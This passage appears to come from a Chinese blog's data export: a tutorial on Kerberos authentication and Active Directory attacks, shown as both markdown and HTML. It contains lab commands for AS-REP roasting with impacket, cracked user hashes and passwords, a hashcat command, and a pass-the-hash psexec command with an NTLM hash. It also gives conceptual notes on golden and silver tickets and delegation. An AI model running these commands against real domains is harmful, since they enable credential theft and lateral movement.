--force '……' rockyou.txt # 利用hashcat 进行爆破\nlixiuying@xiaorang.lab:winniethepooh\nhuachunmei@xiaorang.lab:1qaz2wsx\n```\n\n### PTH(pass-the-hash)哈希传递\n\n这个阶段我们使用的是用户hash解密可以通过hash伪造用户身份发起请求，这也是哈希传递攻击出现的根本原因\n\n案例\n\n```\nimpacket-psexec administrator@172.22.15.24 -hashes ':0e52d03e9b939997401466a0ec5a9cbc' -codec gbk\n```\n\n# 黄金票据\n\n大概在AS_REQ的时候，我们注意这个TGT，我们一旦知道了krbtgt的hash。其它的一切，都是可以伪造的。伪造的CT_SK只要和上面加密使用的CT_SK保持一致就行。 \n\n而实际场景中我们需要知道这些信息。我们可以伪造任何已经存在并且知道其用户名 的用户。\n\n```\n1.域名称\n2.域的SID值\n3.域的KRBTGT账户NTLM密码哈希\n4.伪造用户名\n```\n\n![image-20241121101838006](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121101838006.png)\n\n# 白银票据\n\n这个伪造大概 发生在 AP_REQ ，这里伪造的是 ST。 \n\n可以看出来只可以访问指定server。不如黄金票据可以访问任意server。\n\n![image-20241121103017103](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121103017103.png)\n\n实际情况下需要如下信息。\n\n```\n1.域名\n2.域sid\n3.目标服务FQDN\n4.服务名\n5.服务账号的NTML HASH\n6.伪造的用户名\n```\n\n# 委派攻击\n\n想象一个场景，弟弟需要借钱，经过张妈同意后成功向张三借到钱。但是有一天。弟弟需要借一个笔，但是张三没有笔，但是他的一个艺术生同学有，张三先向他同学借，然后把这个笔给了弟弟。\n\n总的来说，就是\n\n用户A(hostA)、服务B(hostB)、服务C(hostC)，这时用户A想要使用hostB上的服务B，这个功能需要让主机hostB上的服务B访问主机HostC上的服务C中专属于用户A的部分才能完成，因此需要主机hostB上的服务B就需要代表用户A去访问hostC上的服务C，这个过程就被称为委派。\n\n![image-20241121104347394](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121104347394.png)\n\n![image-20241121105307086](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121105307086.png)\n\n这个说实话稍微复杂一些，可以单开一篇文章讲一讲了。\n\n大概可以分为\n\n## 非约束性委派\n\n## 约束性委派\n\n## 基于资源的非约束性委派(RBDC)\n\n这里挖个坑，一个是这个委派，到时候还会详解， 一个是这个Kerberos 到时候还会结合wireshark 流量分析进行详解。\n\n但是其实我感觉原理并不是最难的，而是那些眼花缭乱的工具。还有工具的使用。感觉这些原理不懂有时候也不影响大家对于工具的使用。但是懂一些原理肯定帮你多一个纬度去记忆和理解那些操作。\n\n\n\nhttps://www.bilibili.com/video/BV1DH4y1F7mf\n\nhttps://fushuling.com/index.php/2023/09/02/windows%e5%9f%9f%e6%b8%97%e9%80%8f%e4%b9%8bkerberos%e5%8d%8f%e8%ae%ae/\n","slug":"Kerberos协议简单讲解","published":1,"date":"2024-11-21T03:19:29.023Z","updated":"2024-11-21T03:19:29.023Z","comments":1,"layout":"post","photos":[],"_id":"cm3qw7j710001gb9pg8gu4bn9","content":"<h1 id=\"专业词汇前瞻\"><a href=\"#专业词汇前瞻\" class=\"headerlink\" title=\"专业词汇前瞻\"></a>专业词汇前瞻</h1><p>kerberos协议中也存在三个角色， Client   Server  KDC</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Client:访问服务的客户机</span><br><span class=\"line\">Server:提供服务的服务器</span><br><span class=\"line\"></span><br><span class=\"line\">KDC(Key Distribution Center):密钥分发中心 </span><br><span class=\"line\">KDC中分成两个部分:Authentication Service和Ticket Granting Service</span><br><span class=\"line\">(1)Authentication Service(AS):身份验证服务器</span><br><span class=\"line\">AS的作用就是验证Client端的身份，验证通过之后，AS就会给TGT票据(Ticket Granting Ticket)给Client</span><br><span class=\"line\">(2)Ticket Granting Service(TGS):票据授予服务器</span><br><span class=\"line\">TGS的作用是通过AS发送给Client的TGT换取访问Server端的ST(Server Ticket)给Client.</span><br><span class=\"line\"></span><br><span class=\"line\">凭据</span><br><span class=\"line\">(1)Ticket-granting cookie(TGC):存放用户身份认证凭证的cookie，在浏览器和CAS Server间通讯时使用，是CAS Server用来明确用户身份的凭证。TGT封装了TGC值以及此Cookie值对应的用户信息.</span><br><span class=\"line\">(2)Ticket-granting ticket(TGT):TGT对象的ID就是TGC的值，在服务器端，通过TGC查询TGT.</span><br><span class=\"line\">(3)SEerver Ticket(ST):ST服务票据，由TGS服务发布.</span><br><span class=\"line\"></span><br><span class=\"line\">Active Directory(AD):活动目录，充当集中存储库并存储与Active Directory 用户、计算机、服务器和组织内的其他资源等对象相关的所有数据</span><br><span class=\"line\"></span><br><span class=\"line\">Domain Controller(DC):域控制器</span><br></pre></td></tr></table></figure>\n\n\n\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121000559500.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121000559500.png\"  alt=\"image-20241121000559500\" lazyload></a></p>\n<h1 id=\"现实场景类比\"><a href=\"#现实场景类比\" class=\"headerlink\" title=\"现实场景类比\"></a>现实场景类比</h1><p>这样的话其实有一个问题就是，无发现验证买票者是否合法，凭什么卖票给它。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121002134458.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121002134458.png\"  alt=\"image-20241121002134458\" lazyload></a></p>\n<p>把安检和卖票这两个功能分开即可。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121002151680.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121002151680.png\"  alt=\"image-20241121002151680\" lazyload></a></p>\n<h2 id=\"1-身份检查\"><a href=\"#1-身份检查\" class=\"headerlink\" title=\"1.身份检查\"></a>1.身份检查</h2><p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121003034910.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121003034910.png\"  alt=\"image-20241121003034910\" lazyload></a></p>\n<h2 id=\"2-买票\"><a href=\"#2-买票\" class=\"headerlink\" title=\"2.买票\"></a>2.买票</h2><p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121003134967.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121003134967.png\"  alt=\"image-20241121003134967\" lazyload></a></p>\n<h2 id=\"3-入园\"><a href=\"#3-入园\" class=\"headerlink\" title=\"3.入园\"></a>3.入园</h2><p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121003159449.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121003159449.png\"  alt=\"image-20241121003159449\" lazyload></a></p>\n<h2 id=\"现实场景\"><a href=\"#现实场景\" class=\"headerlink\" title=\"现实场景\"></a>现实场景</h2><p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121003409168.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121003409168.png\"  alt=\"image-20241121003409168\" lazyload></a></p>\n<h1 id=\"过程细节\"><a href=\"#过程细节\" class=\"headerlink\" title=\"过程细节\"></a>过程细节</h1><h2 id=\"AS-REQ-AS-REP\"><a href=\"#AS-REQ-AS-REP\" class=\"headerlink\" title=\"AS_REQ&amp;AS_REP\"></a>AS_REQ&amp;AS_REP</h2><p>依然是clinet拿信息（Name、IP、Time等） 去AS进行认证，认证成功则获取 TGT返回给clinet。</p>\n<p>第一，KDC是存有用户hash的。</p>\n<p>第二，TGT由两部分构成，一部分用hash加密，一部分用krbtgt的hash加密。</p>\n<p>第三，注意上半部分的CT_SK</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121004244873.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121004244873.png\"  alt=\"image-20241121004244873\" lazyload></a></p>\n<h2 id=\"TGS-REQ\"><a href=\"#TGS-REQ\" class=\"headerlink\" title=\"TGS_REQ\"></a>TGS_REQ</h2><p>TGS然后用户对TGT进行一些处理。底部加上我们要访问的目标servername（想要参观的动物），上半部分内容重新用CT_SK加密。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121005119609.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121005119609.png\"  alt=\"image-20241121005119609\" lazyload></a></p>\n<h2 id=\"TGS-REP\"><a href=\"#TGS-REP\" class=\"headerlink\" title=\"TGS_REP\"></a>TGS_REP</h2><ol>\n<li>TSG对用户发回来的TGT下半部分进行解密</li>\n<li>然后用里面的CS_SK对上半部分进行解密</li>\n<li>检测用户信息是都一致，是否遭到恶意篡改</li>\n<li>将ST返回给用户</li>\n</ol>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121005555888.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121005555888.png\"  alt=\"image-20241121005555888\" lazyload></a></p>\n<h2 id=\"AP-REQ-AP-REP\"><a href=\"#AP-REQ-AP-REP\" class=\"headerlink\" title=\"AP_REQ&amp;AP_REP\"></a>AP_REQ&amp;AP_REP</h2><p>最后一步拿着ST去参观即可。</p>\n<p>用户始终无法读取下半部分的内容，一但发现与上半部分不一样，定是上半部分的内容遭遇了篡改伪造。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121010329215.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121010329215.png\"  alt=\"image-20241121010329215\" lazyload></a></p>\n<p>其实例子比较抽象，为了更加方便大家理解同时也丧失了一定的严谨性，其实最主要的还是尝试接受这些知识，然后对这个流程有一个大致的了解即可。</p>\n<h1 id=\"攻击\"><a href=\"#攻击\" class=\"headerlink\" title=\"攻击\"></a>攻击</h1><p>其实这些攻击说需要的信息怎么收集，这些攻击怎么实现，用什么工具。这里不深入探讨，主要还比靠大家在实践中积累。</p>\n<h2 id=\"AS-REQ\"><a href=\"#AS-REQ\" class=\"headerlink\" title=\"AS_REQ\"></a>AS_REQ</h2><p>其实好多攻击都生在这个阶段。</p>\n<h3 id=\"域内用户枚举\"><a href=\"#域内用户枚举\" class=\"headerlink\" title=\"域内用户枚举\"></a>域内用户枚举</h3><h3 id=\"密码喷洒\"><a href=\"#密码喷洒\" class=\"headerlink\" title=\"密码喷洒\"></a>密码喷洒</h3><h3 id=\"AS-REP-Roasting\"><a href=\"#AS-REP-Roasting\" class=\"headerlink\" title=\"AS-REP Roasting\"></a>AS-REP Roasting</h3><p>在as-req阶段，请求包cname对应的值是用户名，当用户状态不同时，比如用户存在且启用、用户存在但禁用、用户不存在，不同的状态返回包的提示都是不同的，因此可以进行枚举。</p>\n<p>案例</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">impacket-GetNPUsers -dc-ip 172.22.15.13  xiaorang.lab/ -usersfile user.txt  # 枚举域内用户</span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">krb5asrep$23<span class=\"variable\">$lixiuying</span>@XIAORANG.LAB:9bccb028399d418e7868c57be60afcaf<span class=\"variable\">$8ea13235b6f1c2c7b6a7a20d4dc635e1e24805b2bcb9c391b8574977ac751a4ccb3cc4efd1ed47126ee95f1ed0879c103e60fc4dca57e269ba37bfe796a6286ca391061b666010ca69f4ac45b664cab6a7a17b7da508e7bfb0e04c69fa63a4481379ae03abea511486a189b80c1502a9acf310033ba1c901137eb8152431c5ac413d271a269ab6a719207403657e85a98c11375f81801e43517bb0d619d939c9f8f706c6689adb653d3925acae94864d746e30ec9d581a2d2243e9453044b59d8ec7ab349c23193d90b0dbbe3eac1a1215a1e24fa26d1289a34003b44b95976a9b2f4aa1ea49cda5cdcd8e41</span></span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">krb5asrep$23<span class=\"variable\">$huachunmei</span>@XIAORANG.LAB:879b2674cec6a159d3a5f96202160634<span class=\"variable\">$c88520dd6e951b91e04929aa636d965d0931f035a5a46245c8dd1a02ceeaa633dbd96718dfb1622f7ae6a40bafe2e51f43131b05082f3853dbb1b15aa302affac5e952d298ac0174e5ae6bcb5c00cd0f7dbddcb2bb6ce8730c134daf6251fbe5338b6d2a31580051b60dd71e1b8d5cf80546c4a7c44a79a24511bc7f77a09a3aebe05330f4b23e150f09884ae525fff367c956990c70545a45e3f987812eafb2e95b8769618dc1d8b8db20a4c1b374348d36a6093735673214b711025bd6fa1fe5b1ed97caf45e49b7fa17c606afca249b2180a55809ae4a57f1fcdabc8b96381c0ad6b580ef8218a2e2aa0c</span></span></span><br><span class=\"line\"></span><br><span class=\"line\">hashcat -a 0 -m 18200 --force &#x27;……&#x27; rockyou.txt # 利用hashcat 进行爆破</span><br><span class=\"line\">lixiuying@xiaorang.lab:winniethepooh</span><br><span class=\"line\">huachunmei@xiaorang.lab:1qaz2wsx</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"PTH-pass-the-hash-哈希传递\"><a href=\"#PTH-pass-the-hash-哈希传递\" class=\"headerlink\" title=\"PTH(pass-the-hash)哈希传递\"></a>PTH(pass-the-hash)哈希传递</h3><p>这个阶段我们使用的是用户hash解密可以通过hash伪造用户身份发起请求，这也是哈希传递攻击出现的根本原因</p>\n<p>案例</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">impacket-psexec administrator@172.22.15.24 -hashes &#x27;:0e52d03e9b939997401466a0ec5a9cbc&#x27; -codec gbk</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"黄金票据\"><a href=\"#黄金票据\" class=\"headerlink\" title=\"黄金票据\"></a>黄金票据</h1><p>大概在AS_REQ的时候，我们注意这个TGT，我们一旦知道了krbtgt的hash。其它的一切，都是可以伪造的。伪造的CT_SK只要和上面加密使用的CT_SK保持一致就行。 </p>\n<p>而实际场景中我们需要知道这些信息。我们可以伪造任何已经存在并且知道其用户名 的用户。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.域名称</span><br><span class=\"line\">2.域的SID值</span><br><span class=\"line\">3.域的KRBTGT账户NTLM密码哈希</span><br><span class=\"line\">4.伪造用户名</span><br></pre></td></tr></table></figure>\n\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121101838006.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121101838006.png\"  alt=\"image-20241121101838006\" lazyload></a></p>\n<h1 id=\"白银票据\"><a href=\"#白银票据\" class=\"headerlink\" title=\"白银票据\"></a>白银票据</h1><p>这个伪造大概 发生在 AP_REQ ，这里伪造的是 ST。 </p>\n<p>可以看出来只可以访问指定server。不如黄金票据可以访问任意server。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121103017103.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121103017103.png\"  alt=\"image-20241121103017103\" lazyload></a></p>\n<p>实际情况下需要如下信息。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.域名</span><br><span class=\"line\">2.域sid</span><br><span class=\"line\">3.目标服务FQDN</span><br><span class=\"line\">4.服务名</span><br><span class=\"line\">5.服务账号的NTML HASH</span><br><span class=\"line\">6.伪造的用户名</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"委派攻击\"><a href=\"#委派攻击\" class=\"headerlink\" title=\"委派攻击\"></a>委派攻击</h1><p>想象一个场景，弟弟需要借钱，经过张妈同意后成功向张三借到钱。但是有一天。弟弟需要借一个笔，但是张三没有笔，但是他的一个艺术生同学有，张三先向他同学借，然后把这个笔给了弟弟。</p>\n<p>总的来说，就是</p>\n<p>用户A(hostA)、服务B(hostB)、服务C(hostC)，这时用户A想要使用hostB上的服务B，这个功能需要让主机hostB上的服务B访问主机HostC上的服务C中专属于用户A的部分才能完成，因此需要主机hostB上的服务B就需要代表用户A去访问hostC上的服务C，这个过程就被称为委派。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121104347394.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121104347394.png\"  alt=\"image-20241121104347394\" lazyload></a></p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121105307086.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121105307086.png\"  alt=\"image-20241121105307086\" lazyload></a></p>\n<p>这个说实话稍微复杂一些，可以单开一篇文章讲一讲了。</p>\n<p>大概可以分为</p>\n<h2 id=\"非约束性委派\"><a href=\"#非约束性委派\" class=\"headerlink\" title=\"非约束性委派\"></a>非约束性委派</h2><h2 id=\"约束性委派\"><a href=\"#约束性委派\" class=\"headerlink\" title=\"约束性委派\"></a>约束性委派</h2><h2 id=\"基于资源的非约束性委派-RBDC\"><a href=\"#基于资源的非约束性委派-RBDC\" class=\"headerlink\" title=\"基于资源的非约束性委派(RBDC)\"></a>基于资源的非约束性委派(RBDC)</h2><p>这里挖个坑，一个是这个委派，到时候还会详解， 一个是这个Kerberos 到时候还会结合wireshark 流量分析进行详解。</p>\n<p>但是其实我感觉原理并不是最难的，而是那些眼花缭乱的工具。还有工具的使用。感觉这些原理不懂有时候也不影响大家对于工具的使用。但是懂一些原理肯定帮你多一个纬度去记忆和理解那些操作。</p>\n<p><a href=\"https://www.bilibili.com/video/BV1DH4y1F7mf\">https://www.bilibili.com/video/BV1DH4y1F7mf</a></p>\n<p><a href=\"https://fushuling.com/index.php/2023/09/02/windows%e5%9f%9f%e6%b8%97%e9%80%8f%e4%b9%8bkerberos%e5%8d%8f%e8%ae%ae/\">https://fushuling.com/index.php/2023/09/02/windows%e5%9f%9f%e6%b8%97%e9%80%8f%e4%b9%8bkerberos%e5%8d%8f%e8%ae%ae/</a></p>\n","excerpt":"","more":"<h1 id=\"专业词汇前瞻\"><a href=\"#专业词汇前瞻\" class=\"headerlink\" title=\"专业词汇前瞻\"></a>专业词汇前瞻</h1><p>kerberos协议中也存在三个角色， Client   Server  KDC</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Client:访问服务的客户机</span><br><span class=\"line\">Server:提供服务的服务器</span><br><span class=\"line\"></span><br><span class=\"line\">KDC(Key Distribution Center):密钥分发中心 </span><br><span class=\"line\">KDC中分成两个部分:Authentication Service和Ticket Granting Service</span><br><span class=\"line\">(1)Authentication Service(AS):身份验证服务器</span><br><span class=\"line\">AS的作用就是验证Client端的身份，验证通过之后，AS就会给TGT票据(Ticket Granting Ticket)给Client</span><br><span class=\"line\">(2)Ticket Granting Service(TGS):票据授予服务器</span><br><span class=\"line\">TGS的作用是通过AS发送给Client的TGT换取访问Server端的ST(Server Ticket)给Client.</span><br><span class=\"line\"></span><br><span class=\"line\">凭据</span><br><span class=\"line\">(1)Ticket-granting cookie(TGC):存放用户身份认证凭证的cookie，在浏览器和CAS Server间通讯时使用，是CAS Server用来明确用户身份的凭证。TGT封装了TGC值以及此Cookie值对应的用户信息.</span><br><span class=\"line\">(2)Ticket-granting ticket(TGT):TGT对象的ID就是TGC的值，在服务器端，通过TGC查询TGT.</span><br><span class=\"line\">(3)SEerver Ticket(ST):ST服务票据，由TGS服务发布.</span><br><span class=\"line\"></span><br><span class=\"line\">Active Directory(AD):活动目录，充当集中存储库并存储与Active Directory 用户、计算机、服务器和组织内的其他资源等对象相关的所有数据</span><br><span class=\"line\"></span><br><span class=\"line\">Domain Controller(DC):域控制器</span><br></pre></td></tr></table></figure>\n\n\n\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121000559500.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121000559500.png\"  alt=\"image-20241121000559500\" lazyload></a></p>\n<h1 id=\"现实场景类比\"><a href=\"#现实场景类比\" class=\"headerlink\" title=\"现实场景类比\"></a>现实场景类比</h1><p>这样的话其实有一个问题就是，无发现验证买票者是否合法，凭什么卖票给它。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121002134458.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121002134458.png\"  alt=\"image-20241121002134458\" lazyload></a></p>\n<p>把安检和卖票这两个功能分开即可。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121002151680.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121002151680.png\"  alt=\"image-20241121002151680\" lazyload></a></p>\n<h2 id=\"1-身份检查\"><a href=\"#1-身份检查\" class=\"headerlink\" title=\"1.身份检查\"></a>1.身份检查</h2><p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121003034910.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121003034910.png\"  alt=\"image-20241121003034910\" lazyload></a></p>\n<h2 id=\"2-买票\"><a href=\"#2-买票\" class=\"headerlink\" title=\"2.买票\"></a>2.买票</h2><p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121003134967.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121003134967.png\"  alt=\"image-20241121003134967\" lazyload></a></p>\n<h2 id=\"3-入园\"><a href=\"#3-入园\" class=\"headerlink\" title=\"3.入园\"></a>3.入园</h2><p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121003159449.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121003159449.png\"  alt=\"image-20241121003159449\" lazyload></a></p>\n<h2 id=\"现实场景\"><a href=\"#现实场景\" class=\"headerlink\" title=\"现实场景\"></a>现实场景</h2><p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121003409168.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121003409168.png\"  alt=\"image-20241121003409168\" lazyload></a></p>\n<h1 id=\"过程细节\"><a href=\"#过程细节\" class=\"headerlink\" title=\"过程细节\"></a>过程细节</h1><h2 id=\"AS-REQ-AS-REP\"><a href=\"#AS-REQ-AS-REP\" class=\"headerlink\" title=\"AS_REQ&amp;AS_REP\"></a>AS_REQ&amp;AS_REP</h2><p>依然是clinet拿信息（Name、IP、Time等） 去AS进行认证，认证成功则获取 TGT返回给clinet。</p>\n<p>第一，KDC是存有用户hash的。</p>\n<p>第二，TGT由两部分构成，一部分用hash加密，一部分用krbtgt的hash加密。</p>\n<p>第三，注意上半部分的CT_SK</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121004244873.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121004244873.png\"  alt=\"image-20241121004244873\" lazyload></a></p>\n<h2 id=\"TGS-REQ\"><a href=\"#TGS-REQ\" class=\"headerlink\" title=\"TGS_REQ\"></a>TGS_REQ</h2><p>TGS然后用户对TGT进行一些处理。底部加上我们要访问的目标servername（想要参观的动物），上半部分内容重新用CT_SK加密。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121005119609.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121005119609.png\"  alt=\"image-20241121005119609\" lazyload></a></p>\n<h2 id=\"TGS-REP\"><a href=\"#TGS-REP\" class=\"headerlink\" title=\"TGS_REP\"></a>TGS_REP</h2><ol>\n<li>TSG对用户发回来的TGT下半部分进行解密</li>\n<li>然后用里面的CS_SK对上半部分进行解密</li>\n<li>检测用户信息是都一致，是否遭到恶意篡改</li>\n<li>将ST返回给用户</li>\n</ol>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121005555888.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121005555888.png\"  alt=\"image-20241121005555888\" lazyload></a></p>\n<h2 id=\"AP-REQ-AP-REP\"><a href=\"#AP-REQ-AP-REP\" class=\"headerlink\" title=\"AP_REQ&amp;AP_REP\"></a>AP_REQ&amp;AP_REP</h2><p>最后一步拿着ST去参观即可。</p>\n<p>用户始终无法读取下半部分的内容，一但发现与上半部分不一样，定是上半部分的内容遭遇了篡改伪造。</p>\n<p><a class=\"simple-lightbox\" href=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121010329215.png\"><img   src=\"/images/loading.svg\" data-src=\"https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20241121010329215.png\"  alt=\"image-20241121010329215\" lazyload></a></p>\n<p>其实例子比较抽象，为了更加方便大家理解同时也丧失了一定的严谨性，其实最主要的还是尝试接受这些知识，然后对这个流程有一个大致的了解即可。</p>\n<h1 id=\"攻击\"><a href=\"#攻击\" class=\"headerlink\" title=\"攻击\"></a>攻击</h1><p>其实这些攻击说需要的信息怎么收集，这些攻击怎么实现，用什么工具。这里不深入探讨，主要还比靠大家在实践中积累。</p>\n<h2 id=\"AS-REQ\"><a href=\"#AS-REQ\" class=\"headerlink\" title=\"AS_REQ\"></a>AS_REQ</h2><p>其实好多攻击都生在这个阶段。</p>\n<h3 id=\"域内用户枚举\"><a href=\"#域内用户枚举\" class=\"headerlink\" title=\"域内用户枚举\"></a>域内用户枚举</h3><h3 id=\"密码喷洒\"><a href=\"#密码喷洒\" class=\"headerlink\" 